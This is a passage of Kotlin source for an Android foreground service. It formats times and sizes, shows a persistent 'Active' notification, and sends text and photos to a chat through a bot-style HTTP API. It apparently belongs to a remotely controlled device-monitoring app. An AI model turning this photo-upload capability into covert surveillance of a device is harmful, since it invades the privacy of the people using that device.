            s < 60   -> "${s}s"
            s < 3600 -> "${s / 60}m ${s % 60}s"
            else     -> "${s / 3600}h ${(s % 3600) / 60}m"
        }
    }

    private fun formatSize(bytes: Long): String = when {
        bytes >= 1_073_741_824L -> "${"%.1f".format(bytes / 1_073_741_824.0)} GB"
        bytes >= 1_048_576L     -> "${"%.1f".format(bytes / 1_048_576.0)} MB"
        bytes >= 1_024L         -> "${"%.1f".format(bytes / 1_024.0)} KB"
        else                    -> "$bytes B"
    }

    private fun startForegroundWithNotification() {
        val pi = PendingIntent.getActivity(this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        val notif = NotificationCompat.Builder(this, getString(R.string.notif_channel_id))
            .setContentTitle(getString(R.string.notif_title))
            .setContentText("[$deviceNumber] $deviceName — Active")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setOngoing(true).setContentIntent(pi).build()
        startForeground(NOTIFICATION_ID, notif)
    }

    private fun sendMessage(chatId: String, text: String, parseMode: String? = null) {
        // If stop was requested for this chat, skip non-stop messages silently
        if (stopFlags[chatId] == true && !text.contains("🛑")) return
        try {
            val json = JSONObject().apply {
                put("chat_id", chatId); put("text", text)
                if (parseMode != null) put("parse_mode", parseMode)
            }
            httpClient.newCall(Request.Builder().url(URL_SEND_MSG)
                .post(json.toString().toRequestBody("application/json".toMediaTypeOrNull())).build())
                .execute().use {}
        } catch (e: Exception) { Log.e(TAG, "sendMsg: ${e.message}") }
    }

    private fun sendPhoto(chatId: String, file: File, caption: String) {
        try {
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("caption", caption)
                .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaTypeOrNull())).build()
            httpClient.newCall(Request.Builder().url(URL_SEND_PHOTO).post(body).build()).execute().use { r ->
                if (!r.isSuccessful) sendMessage(chatId, "${dp()}❌ Photo failed: ${r.code}")
            }
        } catch (e: Exception) { sendMessage(chatId, "${dp()}❌ Photo error: ${e.message}") }
    }
}
